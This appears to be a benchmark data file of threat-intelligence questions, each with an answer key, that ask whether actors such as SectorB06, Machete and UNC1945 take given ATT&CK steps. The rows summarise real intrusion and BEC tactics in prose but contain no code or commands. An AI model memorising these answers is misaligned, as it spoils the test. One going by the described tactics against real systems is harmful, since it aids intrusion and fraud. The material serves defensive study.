Question ID,AttackSeq ID,Batch ID,Question,Key Points,Context,Ground Truth,Source
6,1,1-Defense Evasion-T1055-Process Injection,"After achieving persistence by adding IntelGraphicsController entries into registry run keys with a specific value format, is the SectorB06 malware likely to impersonate a legitimate Symantec executable file and perform actions such as process injection and timestomping for defense evasion?","Defense Evasion: The malware employs several defense evasion techniques, including checking for debuggers, process name hashing, and process injection. It also uses timestomping to modify the timestamps of its dropped files to approximate those of kernel32.dll. Additionally, the malware impersonates a legitimate Symantec executable file to avoid detection.","Initial Access: On April 30, 2019, the ThreatRecon Team reported that SectorB06, a state-sponsored threat actor group, has been exploiting vulnerabilities in Microsoft Office's Equation Editor, specifically a highly obfuscated version of CVE-2017-11882. The group targeted organizations by using a Mongolian language decoy document referencing the Ministry of Justice and Internal Affairs of Mongolia. The document was uploaded from a Singapore IP address and was designed to drop first-stage malware if the exploit was successful.
Execution: The first-stage malware, identified as RasTls.dll, begins by resolving encoded API addresses and then starts a thread to poll for the presence of a debugger, exiting if one is found. It uses a custom hashing algorithm to check the process name it is running under against a list of expected names, including 'winword.exe', 'excel.exe', 'powerpnt.exe', 'acrord32.exe', and 'eqnedt32.exe'. The malware also runs CreateProcess with commands to manipulate file ownership and drops batch files to delete the initial malware file and winword.exe.
Persistence: The malware achieves persistence by decompressing and dropping two files: RasTls.dll (renamed from cclerr.wll) and IntelGraphicsController.exe/AcroRd32.exe, which is a legitimate signed Symantec file (real name: dot1xtra.exe). These files are stored in directories related to Intel Processor Graphics and are added to the registry run keys for persistence. The registry key used is 'IntelGraphicsController' with a specific value format.
Discovery: The malware performs discovery by querying the registry and identifying victim machines using a specific registry key under 'Software\Intel\Java'. It also checks for the presence of certain processes on the system.
Command and Control: The second-stage malware, which was not analyzed in detail, is designed to create a remote command shell and communicates with external C2 IP addresses on port 443. It also references internal IP addresses, indicating that the threat actor already has basic access to the victim's internal network.
Others: The CTI report from ThreatRecon Team on May 27, 2019, provides an overview of the activities of SectorB06, a state-sponsored threat actor group active in Asia. The report includes details on the malware used, the exploitation of vulnerabilities, persistence mechanisms, defense evasion tactics, discovery processes, and command and control infrastructure. Additionally, the report lists MITRE ATT&CK Techniques observed in the analysis of the malware and provides indicators of compromise, including hashes and IP addresses.",Yes,SectorB06 using Mongolian language in lure document
8,1,1-Defense Evasion-T1036-Masquerading,"After decompressing and dropping files such as RasTls.dll and IntelGraphicsController.exe/AcroRd32.exe to achieve persistence by adding these to the registry run keys, is the malware likely to impersonate a legitimate Symantec executable file under the Defense Evasion tactic?","Defense Evasion: The malware employs several defense evasion techniques, including checking for debuggers, process name hashing, and process injection. It also uses timestomping to modify the timestamps of its dropped files to approximate those of kernel32.dll. Additionally, the malware impersonates a legitimate Symantec executable file to avoid detection.","Initial Access: On April 30, 2019, the ThreatRecon Team reported that SectorB06, a state-sponsored threat actor group, has been exploiting vulnerabilities in Microsoft Office's Equation Editor, specifically a highly obfuscated version of CVE-2017-11882. The group targeted organizations by using a Mongolian language decoy document referencing the Ministry of Justice and Internal Affairs of Mongolia. The document was uploaded from a Singapore IP address and was designed to drop first-stage malware if the exploit was successful.
Execution: The first-stage malware, identified as RasTls.dll, begins by resolving encoded API addresses and then starts a thread to poll for the presence of a debugger, exiting if one is found. It uses a custom hashing algorithm to check the process name it is running under against a list of expected names, including 'winword.exe', 'excel.exe', 'powerpnt.exe', 'acrord32.exe', and 'eqnedt32.exe'. The malware also runs CreateProcess with commands to manipulate file ownership and drops batch files to delete the initial malware file and winword.exe.
Persistence: The malware achieves persistence by decompressing and dropping two files: RasTls.dll (renamed from cclerr.wll) and IntelGraphicsController.exe/AcroRd32.exe, which is a legitimate signed Symantec file (real name: dot1xtra.exe). These files are stored in directories related to Intel Processor Graphics and are added to the registry run keys for persistence. The registry key used is 'IntelGraphicsController' with a specific value format.
Discovery: The malware performs discovery by querying the registry and identifying victim machines using a specific registry key under 'Software\Intel\Java'. It also checks for the presence of certain processes on the system.
Command and Control: The second-stage malware, which was not analyzed in detail, is designed to create a remote command shell and communicates with external C2 IP addresses on port 443. It also references internal IP addresses, indicating that the threat actor already has basic access to the victim's internal network.
Others: The CTI report from ThreatRecon Team on May 27, 2019, provides an overview of the activities of SectorB06, a state-sponsored threat actor group active in Asia. The report includes details on the malware used, the exploitation of vulnerabilities, persistence mechanisms, defense evasion tactics, discovery processes, and command and control infrastructure. Additionally, the report lists MITRE ATT&CK Techniques observed in the analysis of the malware and provides indicators of compromise, including hashes and IP addresses.",Yes,SectorB06 using Mongolian language in lure document
9,1,1-Discovery-T1012-Query Registry,"After the malware achieves persistence by adding Intel-related files to registry run keys and impersonating a legitimate Symantec executable for defense evasion, is it likely that the malware will query the registry and identify victim machines as part of its discovery process?",Discovery: The malware performs discovery by querying the registry and identifying victim machines using a specific registry key under 'Software\Intel\Java'. It also checks for the presence of certain processes on the system.,"Initial Access: On April 30, 2019, the ThreatRecon Team reported that SectorB06, a state-sponsored threat actor group, has been exploiting vulnerabilities in Microsoft Office's Equation Editor, specifically a highly obfuscated version of CVE-2017-11882. The group targeted organizations by using a Mongolian language decoy document referencing the Ministry of Justice and Internal Affairs of Mongolia. The document was uploaded from a Singapore IP address and was designed to drop first-stage malware if the exploit was successful.
Execution: The first-stage malware, identified as RasTls.dll, begins by resolving encoded API addresses and then starts a thread to poll for the presence of a debugger, exiting if one is found. It uses a custom hashing algorithm to check the process name it is running under against a list of expected names, including 'winword.exe', 'excel.exe', 'powerpnt.exe', 'acrord32.exe', and 'eqnedt32.exe'. The malware also runs CreateProcess with commands to manipulate file ownership and drops batch files to delete the initial malware file and winword.exe.
Persistence: The malware achieves persistence by decompressing and dropping two files: RasTls.dll (renamed from cclerr.wll) and IntelGraphicsController.exe/AcroRd32.exe, which is a legitimate signed Symantec file (real name: dot1xtra.exe). These files are stored in directories related to Intel Processor Graphics and are added to the registry run keys for persistence. The registry key used is 'IntelGraphicsController' with a specific value format.
Defense Evasion: The malware employs several defense evasion techniques, including checking for debuggers, process name hashing, and process injection. It also uses timestomping to modify the timestamps of its dropped files to approximate those of kernel32.dll. Additionally, the malware impersonates a legitimate Symantec executable file to avoid detection.
Command and Control: The second-stage malware, which was not analyzed in detail, is designed to create a remote command shell and communicates with external C2 IP addresses on port 443. It also references internal IP addresses, indicating that the threat actor already has basic access to the victim's internal network.
Others: The CTI report from ThreatRecon Team on May 27, 2019, provides an overview of the activities of SectorB06, a state-sponsored threat actor group active in Asia. The report includes details on the malware used, the exploitation of vulnerabilities, persistence mechanisms, defense evasion tactics, discovery processes, and command and control infrastructure. Additionally, the report lists MITRE ATT&CK Techniques observed in the analysis of the malware and provides indicators of compromise, including hashes and IP addresses.",Yes,SectorB06 using Mongolian language in lure document
16,100,100-Defense Evasion-T1656-Impersonation,"After impersonating the CEO to initiate email correspondence for a confidential acquisition, is it likely that the threat group will employ defense evasion tactics by using real domains to make emails appear legitimate and stressing confidentiality to prevent validation of the project?","Defense Evasion: The threat group employs defense evasion tactics by stressing confidentiality in their communications, aiming to prevent the targeted employee from validating the legitimacy of the project with their manager or colleagues. They also use real domains to make emails appear as if they are coming directly from the impersonated CEO, either by spoofing the CEO's email address or using an extended spoofed display name. Additionally, the group has been hesitant to use mule accounts in the United States or the United Kingdom, likely indicating that they don't have a good mule network there.","Initial Access: The Israel-based threat group employs a two-stage attack process, with the first stage involving initial email correspondence. They commonly impersonate the CEO of the targeted organization, setting the stage for the attack by claiming the organization is working through the confidential acquisition of another company and requesting assistance with an initial payment. The group uses various tactics to make the emails appear legitimate, such as spoofing the CEO's email address using the real domain if no effective DMARC policy is in place, or updating the sending display name to include the CEO's email address in the display name. The emails are primarily written in English, but some campaigns have been translated into Spanish, French, Italian, and Japanese to fit in with the usual communications of the targeted employee.
Others: The report details the activities of a sophisticated Israel-based threat group responsible for over 350 BEC campaigns since February 2021. The group targets multinational corporations with annual revenues averaging over $10 billion, with employees in at least 61 different countries across six continents. The campaigns follow a cyclical pattern, with 80% of attacks occurring during three periods throughout the year. The group does not target specific industries and prefers larger enterprises. The average amount requested in an attack is $712,000. The group uses real attorneys' identities, often from KPMG, to coordinate payments. The secondary personas referenced are real M&A attorneys based in the UK. The group's unique approach includes requesting large sums of money and transitioning conversations to voice calls via WhatsApp to expedite the process and reduce the paper trail. The report concludes with recommendations for protecting organizations from BEC attacks, emphasizing the need for security solutions that use behavioral AI to understand identity, context, and content.",Yes,Exploring-the-Rise-of-Israel-Based-BEC-Attacks
17,101,101-Initial Access-T1566-Phishing,"After ""Machete"" malware establishes persistence by creating a file named 'Java Update.lnk' pointing to 'appdata/Jre6/java.exe' and installing itself in 'appdata/MicroDes/', is it likely that it will subsequently log keystrokes, capture audio from the computer's microphone, and hijack the clipboard to collect information from the target machine?","Initial Access: The malware known as ""Machete"" is distributed through social engineering tactics, including spear-phishing emails and a fake blog website. No evidence suggests the use of exploits targeting zero-day vulnerabilities. The attackers and victims are both Spanish-speaking. The malware is embedded in PowerPoint presentations disguised as Nullsoft Installer self-extracting archives with names such as 'Hermosa XXX.pps.rar', 'Suntzu.rar', 'El arte de la guerra.rar', and 'Hot brazilian XXX.rar'. These files, when opened, install the malware on the target system.","Persistence: On infected machines, ""Machete"" creates a file named 'Java Update.lnk' pointing to 'appdata/Jre6/java.exe' and installs the malware in 'appdata/ MicroDes/'. It also creates a task named 'Microsoft_up'.
Collection: ""Machete"" is capable of logging keystrokes, capturing audio from the computer's microphone, taking screenshots, capturing geolocation data, taking photos from the computer's web camera, copying files to a remote server, copying files to a special USB device if inserted, and hijacking the clipboard to capture information from the target machine.
Others: The campaign, believed to have started in 2010 and renewed in 2012, may still be active. Victims are primarily located in Venezuela, Ecuador, Colombia, Peru, Russia, Cuba, and Spain, and include high-profile targets such as intelligence services, military, embassies, and government institutions. The malware uses Python embedded into Windows executables, which is unusual and suggests ease of coding rather than multi-platform support. Infrastructure for Mac OS X and Unix victims, as well as a mobile (Android) component, were also discovered. Indicators of Compromise include suspicious domains like 'java.serveblog.net', 'agaliarept.com', and others, as well as a known infection artifact 'hxxp://name.domain.org/nickname/set/Signed_Update.jar'. Malicious samples related to this attack are detected by Kaspersky Lab products as Trojan-Spy.Python.Ragua.",Yes,El_Machete
20,101,101-Collection-T1123-Audio Capture,"After establishing persistence by creating tasks such as 'Microsoft_up' and placing malicious files in directories like 'appdata/ MicroDes/', is ""Machete"" likely to capture audio from the computer's microphone and copy files to a special USB device during the collection phase?","Collection: ""Machete"" is capable of logging keystrokes, capturing audio from the computer's microphone, taking screenshots, capturing geolocation data, taking photos from the computer's web camera, copying files to a remote server, copying files to a special USB device if inserted, and hijacking the clipboard to capture information from the target machine.","Initial Access: The malware known as ""Machete"" is distributed through social engineering tactics, including spear-phishing emails and a fake blog website. No evidence suggests the use of exploits targeting zero-day vulnerabilities. The attackers and victims are both Spanish-speaking. The malware is embedded in PowerPoint presentations disguised as Nullsoft Installer self-extracting archives with names such as 'Hermosa XXX.pps.rar', 'Suntzu.rar', 'El arte de la guerra.rar', and 'Hot brazilian XXX.rar'. These files, when opened, install the malware on the target system.
Persistence: On infected machines, ""Machete"" creates a file named 'Java Update.lnk' pointing to 'appdata/Jre6/java.exe' and installs the malware in 'appdata/ MicroDes/'. It also creates a task named 'Microsoft_up'.
Others: The campaign, believed to have started in 2010 and renewed in 2012, may still be active. Victims are primarily located in Venezuela, Ecuador, Colombia, Peru, Russia, Cuba, and Spain, and include high-profile targets such as intelligence services, military, embassies, and government institutions. The malware uses Python embedded into Windows executables, which is unusual and suggests ease of coding rather than multi-platform support. Infrastructure for Mac OS X and Unix victims, as well as a mobile (Android) component, were also discovered. Indicators of Compromise include suspicious domains like 'java.serveblog.net', 'agaliarept.com', and others, as well as a known infection artifact 'hxxp://name.domain.org/nickname/set/Signed_Update.jar'. Malicious samples related to this attack are detected by Kaspersky Lab products as Trojan-Spy.Python.Ragua.",Yes,El_Machete
24,101,101-Collection-T1025-Data from Removable Media,"After achieving persistence by creating a task named 'Microsoft_up' and storing the malware in 'appdata/MicroDes/', is Machete likely to copy files to a special USB device as part of its collection capabilities?","Collection: ""Machete"" is capable of logging keystrokes, capturing audio from the computer's microphone, taking screenshots, capturing geolocation data, taking photos from the computer's web camera, copying files to a remote server, copying files to a special USB device if inserted, and hijacking the clipboard to capture information from the target machine.","Initial Access: The malware known as ""Machete"" is distributed through social engineering tactics, including spear-phishing emails and a fake blog website. No evidence suggests the use of exploits targeting zero-day vulnerabilities. The attackers and victims are both Spanish-speaking. The malware is embedded in PowerPoint presentations disguised as Nullsoft Installer self-extracting archives with names such as 'Hermosa XXX.pps.rar', 'Suntzu.rar', 'El arte de la guerra.rar', and 'Hot brazilian XXX.rar'. These files, when opened, install the malware on the target system.
Persistence: On infected machines, ""Machete"" creates a file named 'Java Update.lnk' pointing to 'appdata/Jre6/java.exe' and installs the malware in 'appdata/ MicroDes/'. It also creates a task named 'Microsoft_up'.
Others: The campaign, believed to have started in 2010 and renewed in 2012, may still be active. Victims are primarily located in Venezuela, Ecuador, Colombia, Peru, Russia, Cuba, and Spain, and include high-profile targets such as intelligence services, military, embassies, and government institutions. The malware uses Python embedded into Windows executables, which is unusual and suggests ease of coding rather than multi-platform support. Infrastructure for Mac OS X and Unix victims, as well as a mobile (Android) component, were also discovered. Indicators of Compromise include suspicious domains like 'java.serveblog.net', 'agaliarept.com', and others, as well as a known infection artifact 'hxxp://name.domain.org/nickname/set/Signed_Update.jar'. Malicious samples related to this attack are detected by Kaspersky Lab products as Trojan-Spy.Python.Ragua.",Yes,El_Machete
27,102,102-Privilege Escalation-T1068-Exploitation for Privilege Escalation,"After maintaining persistence on a Solaris 9 server by placing a copy of a legitimate pam_unix.so file and SLAPSTICK in the /lib64/security folder, is UNC1945 likely to use the SLAPSTICK backdoor and Mimikatz to escalate privileges before installing backdoors like TINYSHELL on various endpoints?","Privilege Escalation: UNC1945 escalated privileges using the SLAPSTICK backdoor and open source tools like Mimikatz. They also installed three backdoors: SLAPSTICK, TINYSHELL, and OKSOLO on various endpoints after escalating privileges.","Initial Access: In late 2018, UNC1945 exploited a vulnerability in an internet-exposed Solaris server's SSH service to install the SLAPSTICK backdoor, enabling credential capture for further compromise. In mid-2020, UNC1945 deployed the EVILSUN tool containing a zero-day exploit for CVE-2020-14871 on a Solaris 9 server, facilitating remote exploitation without authentication.
Execution: UNC1945 utilized custom virtual machines pre-configured with post-exploitation tools to execute commands, transfer files, and establish tunnel connections. They also employed a custom Linux backdoor named LEMONSTICK for command execution and file transfer.
Persistence: UNC1945 established persistence on a Solaris 9 server using the SLAPSTICK backdoor, which allowed user access with a secret hard-coded password. They also placed a copy of a legitimate pam_unix.so file and SLAPSTICK in the /lib64/security folder to maintain access.
Defense Evasion: UNC1945 employed anti-forensics techniques using a custom ELF utility named LOGBLEACH to clean logs and built-in Linux commands to alter timestamps. They also executed a Linux ELF packer named STEELCORGI in memory to obfuscate activity.
Credential Access: UNC1945 collected credentials using the SLAPSTICK backdoor and Mimikatz, enabling lateral movement throughout networks and access to other network segments and third-party environments.
Discovery: UNC1945 maintained various tools for internal reconnaissance, including network scanners, exploits, and reconnaissance tools contained within their custom virtual machines. They also employed a SPARC executable identified as a reconnaissance tool, possibly referred to as Luckscan or BlueKeep.
Lateral Movement: UNC1945 moved laterally through networks using stolen credentials and tools such as ProxyChains to download PUPYRAT. They also used IMPACKET with SMBEXEC in a Windows environment for remote command execution and moved laterally via RDP to a Windows server.
Command and Control: UNC1945 used SSH Port Forwarding to maintain access to their external infrastructure and deployed a custom QEMU Virtual Machine on multiple hosts for direct access to the command and control server, obfuscating interaction with customer infrastructure.
Others: Mandiant did not observe evidence of data exfiltration and was unable to determine UNC1945's mission for most of the intrusions investigated. In at least one case, ROLLCOAST ransomware deployment was observed in the final phase of threat actor activity, but not attributed to UNC1945. It is likely that access to the victim environment was sold to another group.",Yes,fireeye.com-Live off the Land How About Bringing Your Own Island An Overview of UNC1945
29,102,102-Defense Evasion-T1027-Obfuscated Files or Information,Is it likely that UNC1945 escalated privileges using the SLAPSTICK backdoor and other tools before employing anti-forensics techniques such as executing the STEELCORGI ELF packer in memory for log obfuscation?,Defense Evasion: UNC1945 employed anti-forensics techniques using a custom ELF utility named LOGBLEACH to clean logs and built-in Linux commands to alter timestamps. They also executed a Linux ELF packer named STEELCORGI in memory to obfuscate activity.,"Initial Access: In late 2018, UNC1945 exploited a vulnerability in an internet-exposed Solaris server's SSH service to install the SLAPSTICK backdoor, enabling credential capture for further compromise. In mid-2020, UNC1945 deployed the EVILSUN tool containing a zero-day exploit for CVE-2020-14871 on a Solaris 9 server, facilitating remote exploitation without authentication.
Execution: UNC1945 utilized custom virtual machines pre-configured with post-exploitation tools to execute commands, transfer files, and establish tunnel connections. They also employed a custom Linux backdoor named LEMONSTICK for command execution and file transfer.
Persistence: UNC1945 established persistence on a Solaris 9 server using the SLAPSTICK backdoor, which allowed user access with a secret hard-coded password. They also placed a copy of a legitimate pam_unix.so file and SLAPSTICK in the /lib64/security folder to maintain access.
Privilege Escalation: UNC1945 escalated privileges using the SLAPSTICK backdoor and open source tools like Mimikatz. They also installed three backdoors: SLAPSTICK, TINYSHELL, and OKSOLO on various endpoints after escalating privileges.
Credential Access: UNC1945 collected credentials using the SLAPSTICK backdoor and Mimikatz, enabling lateral movement throughout networks and access to other network segments and third-party environments.
Discovery: UNC1945 maintained various tools for internal reconnaissance, including network scanners, exploits, and reconnaissance tools contained within their custom virtual machines. They also employed a SPARC executable identified as a reconnaissance tool, possibly referred to as Luckscan or BlueKeep.
Lateral Movement: UNC1945 moved laterally through networks using stolen credentials and tools such as ProxyChains to download PUPYRAT. They also used IMPACKET with SMBEXEC in a Windows environment for remote command execution and moved laterally via RDP to a Windows server.
Command and Control: UNC1945 used SSH Port Forwarding to maintain access to their external infrastructure and deployed a custom QEMU Virtual Machine on multiple hosts for direct access to the command and control server, obfuscating interaction with customer infrastructure.
Others: Mandiant did not observe evidence of data exfiltration and was unable to determine UNC1945's mission for most of the intrusions investigated. In at least one case, ROLLCOAST ransomware deployment was observed in the final phase of threat actor activity, but not attributed to UNC1945. It is likely that access to the victim environment was sold to another group.",Yes,fireeye.com-Live off the Land How About Bringing Your Own Island An Overview of UNC1945
32,102,102-Lateral Movement-T1550-Use Alternate Authentication Material,"After leveraging reconnaissance tools within their custom virtual machines for internal scanning and network exploitation during the Discovery phase, is it likely that UNC1945 will use stolen credentials and tools like ProxyChains to download PUPYRAT before moving laterally to a Windows server via RDP in the Lateral Movement phase?",Lateral Movement: UNC1945 moved laterally through networks using stolen credentials and tools such as ProxyChains to download PUPYRAT. They also used IMPACKET with SMBEXEC in a Windows environment for remote command execution and moved laterally via RDP to a Windows server.,"Initial Access: In late 2018, UNC1945 exploited a vulnerability in an internet-exposed Solaris server's SSH service to install the SLAPSTICK backdoor, enabling credential capture for further compromise. In mid-2020, UNC1945 deployed the EVILSUN tool containing a zero-day exploit for CVE-2020-14871 on a Solaris 9 server, facilitating remote exploitation without authentication.
Execution: UNC1945 utilized custom virtual machines pre-configured with post-exploitation tools to execute commands, transfer files, and establish tunnel connections. They also employed a custom Linux backdoor named LEMONSTICK for command execution and file transfer.
Persistence: UNC1945 established persistence on a Solaris 9 server using the SLAPSTICK backdoor, which allowed user access with a secret hard-coded password. They also placed a copy of a legitimate pam_unix.so file and SLAPSTICK in the /lib64/security folder to maintain access.
Privilege Escalation: UNC1945 escalated privileges using the SLAPSTICK backdoor and open source tools like Mimikatz. They also installed three backdoors: SLAPSTICK, TINYSHELL, and OKSOLO on various endpoints after escalating privileges.
Defense Evasion: UNC1945 employed anti-forensics techniques using a custom ELF utility named LOGBLEACH to clean logs and built-in Linux commands to alter timestamps. They also executed a Linux ELF packer named STEELCORGI in memory to obfuscate activity.
Credential Access: UNC1945 collected credentials using the SLAPSTICK backdoor and Mimikatz, enabling lateral movement throughout networks and access to other network segments and third-party environments.
Discovery: UNC1945 maintained various tools for internal reconnaissance, including network scanners, exploits, and reconnaissance tools contained within their custom virtual machines. They also employed a SPARC executable identified as a reconnaissance tool, possibly referred to as Luckscan or BlueKeep.
Command and Control: UNC1945 used SSH Port Forwarding to maintain access to their external infrastructure and deployed a custom QEMU Virtual Machine on multiple hosts for direct access to the command and control server, obfuscating interaction with customer infrastructure.
Others: Mandiant did not observe evidence of data exfiltration and was unable to determine UNC1945's mission for most of the intrusions investigated. In at least one case, ROLLCOAST ransomware deployment was observed in the final phase of threat actor activity, but not attributed to UNC1945. It is likely that access to the victim environment was sold to another group.",Yes,fireeye.com-Live off the Land How About Bringing Your Own Island An Overview of UNC1945
